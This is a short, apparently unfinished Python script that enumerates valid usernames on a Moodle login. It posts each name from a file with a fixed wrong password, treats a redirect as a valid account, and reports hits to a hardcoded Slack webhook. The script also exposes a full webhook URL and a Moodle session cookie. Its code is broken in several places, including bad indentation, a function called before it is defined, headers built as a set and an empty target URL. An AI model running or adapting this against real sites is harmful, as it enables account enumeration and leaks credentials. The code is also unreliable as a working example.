import requests
import sys
import getopt
from requests.auth import HTTPDigestAuth
from slack_webhook import Slack


#Slack Hook
slack = Slack(url='https://hooks.slack.com/services/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')
#slack.post(text='Hellooooo')



URL = ""
userlist = open("somefile.txt","r")
user="jimmy"
badpassword ="SomethingShitty"


#incorporated whole post request but commented out required and converted to byte vs string
headers={
    b"Cookie: MoodleSession=tch5otu6blsu15i3s24ig2r8aq",
    }

#draft post request

for user in userlist:
    response = requests.post(URL,headers,auth=HTTPDigestAuth(user,badpassword))  
    #print(response.request.headers)
    #print(response.request.body)
    #print(response.cookies)
        if(response.is_redirect):
            message(user)

def message(valid_user):
    
    message = "%s is a valid user" % valid_user
    slack.post(text=message)

    
    

